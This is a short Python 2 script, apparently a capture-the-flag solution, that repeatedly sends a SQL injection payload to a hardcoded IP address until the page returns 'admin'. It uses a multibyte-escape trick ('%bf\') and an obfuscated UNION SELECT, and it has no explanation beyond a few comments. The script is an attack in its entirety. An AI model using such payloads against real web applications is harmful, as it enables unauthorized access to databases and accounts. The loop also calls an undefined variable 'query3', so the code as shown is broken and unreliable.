# -*- coding:utf-8 -*-

# github.com/munsiwoo

import httplib, urllib2

conn = httplib.HTTPConnection('52.78.77.229')
header = {'Content-Type': 'application/x-www-form-urlencoded'}

param1 = '/index.php?id=%bf\&pw='
param2 = 'union select mid(encrypt(rand(),mid(password(pi()),floor(pi()*pi()*floor(pi()))+ceil(pi()+pi()),true+true)),true,pi()+true+true),true,true#' # payload
query = param1 + urllib2.quote(param2)

while(1):
    conn.request('GET', query3, '', header)
    response = str(conn.getresponse().read())
    # response[33:38] == 'ad' + random three characters

    admin = response[33:38].lower()

    if(admin == 'admin'):
        print response
        break

conn.close()